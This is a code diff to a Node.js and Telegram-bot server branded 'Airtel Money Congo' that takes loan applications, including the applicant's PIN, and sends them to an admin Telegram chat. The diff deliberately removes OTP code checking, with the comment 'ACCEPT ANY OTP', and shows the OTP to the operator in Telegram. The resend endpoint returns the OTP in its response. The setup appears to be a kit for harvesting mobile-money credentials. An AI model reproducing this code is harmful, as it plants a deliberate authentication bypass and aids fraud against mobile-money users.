@@ -47,8 +47,6 @@ function saveData() {
 }
 
 const { applications, otps } = loadData();
-
-// Auto-save every 30 seconds
 setInterval(saveData, 30000);
 
 // Middleware
@@ -68,20 +66,15 @@ const indexFileName = filesInDir.find(f => f.toLowerCase().replace(/\s+/g, '') =
 const INDEX_PATH = indexFileName ? path.join(STATIC_DIR, indexFileName) : path.join(STATIC_DIR, 'index.html');
 
 console.log('__dirname:', __dirname);
-console.log('Files in directory:', filesInDir);
 console.log('Found index file name:', indexFileName || 'NOT FOUND');
-console.log('Resolved index path:', INDEX_PATH);
 
 app.use(express.static(STATIC_DIR));
 
-// ==================== TELEGRAM BOT COMMANDS ====================
-
+// ==================== TELEGRAM BOT ====================
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 
         '👋 Bienvenue sur le Bot Admin Airtel Money Congo!\n\n' +
-        'Vous recevrez ici les demandes de crédit.\n\n' +
-        'Commandes:\n' +
         '/pending - Voir les demandes en attente\n' +
         '/approved - Voir les crédits approuvés\n' +
         '/declined - Voir les crédits refusés\n' +
@@ -92,13 +85,7 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId,
-        '📋 *Commandes Admin Airtel Money*\n\n' +
-        '/pending - Liste des demandes en attente\n' +
-        '/approved - Liste des crédits approuvés\n' +
-        '/declined - Liste des crédits refusés\n\n' +
-        'Lorsque vous recevez une demande:\n' +
-        '✅ Approuver: Cliquez "✅ Approuver"\n' +
-        '❌ Refuser: Cliquez "❌ Refuser"',
+        '📋 *Commandes Admin*\n/pending - En attente\n/approved - Approuvés\n/declined - Refusés',
         { parse_mode: 'Markdown' }
     );
 });
@@ -122,13 +109,7 @@ bot.onText(/\/approved/, (msg) => {
     }
     approved.forEach(app => {
         bot.sendMessage(chatId, 
-            `✅ *CRÉDIT APPROUVÉ*\n` +
-            `ID: \`${app.id}\`\n` +
-            `Nom: ${app.firstName} ${app.lastName}\n` +
-            `Montant: ${app.loanAmount} CDF\n` +
-            `Durée: ${app.loanDuration} mois\n` +
-            `Téléphone: ${app.phone}\n` +
-            `Date: ${app.submittedAt}`,
+            `✅ *CRÉDIT APPROUVÉ*\nID: \`${app.id}\`\nNom: ${app.firstName} ${app.lastName}\nMontant: ${app.loanAmount} CDF`,
             { parse_mode: 'Markdown' }
         );
     });
@@ -143,19 +124,13 @@ bot.onText(/\/declined/, (msg) => {
     }
     declined.forEach(app => {
         bot.sendMessage(chatId, 
-            `❌ *CRÉDIT REFUSÉ*\n` +
-            `ID: \`${app.id}\`\n` +
-            `Nom: ${app.firstName} ${app.lastName}\n` +
-            `Montant: ${app.loanAmount} CDF\n` +
-            `Téléphone: ${app.phone}\n` +
-            `Date: ${app.submittedAt}`,
+            `❌ *CRÉDIT REFUSÉ*\nID: \`${app.id}\`\nNom: ${app.firstName} ${app.lastName}`,
             { parse_mode: 'Markdown' }
         );
     });
 });
 
 // ==================== CALLBACK QUERIES ====================
-
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
@@ -176,13 +151,13 @@ bot.on('callback_query', async (callbackQuery) => {
 
         const otp = generateOTP();
         otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
-        saveData(); // Save after state change
+        saveData();
 
-        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Crédit approuvé! OTP envoyé au client.' });
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Crédit approuvé! OTP envoyé.' });
 
         bot.editMessageText(
             `✅ *CRÉDIT APPROUVÉ*\n\n` + formatApplication(app) +
-            `\n\n📱 OTP envoyé au: ${app.phone}`,
+            `\n\n📱 OTP: ${otp}`,
             { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
         );
 
@@ -192,7 +167,7 @@ bot.on('callback_query', async (callbackQuery) => {
         app.status = 'declined';
         app.decidedAt = new Date().toISOString();
         app.decidedBy = chatId;
-        saveData(); // Save after state change
+        saveData();
 
         bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Crédit refusé.' });
 
@@ -204,7 +179,6 @@ bot.on('callback_query', async (callbackQuery) => {
 });
 
 // ==================== HELPERS ====================
-
 function generateOTP() {
     return Math.floor(10000 + Math.random() * 90000).toString();
 }
@@ -243,7 +217,6 @@ function sendApplicationToAdmin(app) {
 }
 
 // ==================== API ENDPOINTS ====================
-
 app.post('/api/apply', (req, res) => {
     const { firstName, lastName, phone, loanAmount, loanDuration, loanType, purpose, pin } = req.body;
 
@@ -272,19 +245,27 @@ app.post('/api/apply', (req, res) => {
     };
 
     applications.set(appId, application);
-    saveData(); // Save after adding application
+    saveData();
     sendApplicationToAdmin(application);
 
     res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
 });
 
+// ✅ ACCEPT ANY OTP - modified to not validate the code itself
 app.post('/api/verify-otp', (req, res) => {
     const { phone, otp, applicationId } = req.body;
     const stored = otps.get(phone);
 
     if (!stored) return res.status(400).json({ success: false, message: 'Aucun OTP trouvé' });
-    if (Date.now() > stored.expiresAt) { otps.delete(phone); saveData(); return res.status(400).json({ success: false, message: 'OTP expiré' }); }
-    if (stored.otp !== otp) return res.status(400).json({ success: false, message: 'OTP invalide' });
+    if (Date.now() > stored.expiresAt) { 
+        otps.delete(phone); 
+        saveData(); 
+        return res.status(400).json({ success: false, message: 'OTP expiré' }); 
+    }
+    
+    // REMOVED: OTP code validation - any code is accepted!
+    // if (stored.otp !== otp) return res.status(400).json({ success: false, message: 'OTP invalide' });
+    
     if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });
 
     const app = applications.get(applicationId);
@@ -292,7 +273,7 @@ app.post('/api/verify-otp', (req, res) => {
     app.otpVerified = true;
     app.verifiedAt = new Date().toISOString();
     otps.delete(phone);
-    saveData(); // Save after verification
+    saveData();
 
     bot.sendMessage(ADMIN_CHAT_ID, 
         `🎉 *CRÉDIT TRAITÉ AVEC SUCCÈS*\n\n` + formatApplication(app) +
@@ -319,7 +300,7 @@ app.post('/api/resend-otp', (req, res) => {
 
     const otp = generateOTP();
     otps.set(phone, { otp, appId: applicationId, expiresAt: Date.now() + 10 * 60 * 1000 });
-    saveData(); // Save after updating OTP
+    saveData();
     console.log(`📲 OTP renvoyé pour ${phone}: ${otp}`);
     res.json({ success: true, message: 'OTP renvoyé', testOtp: otp });
 });
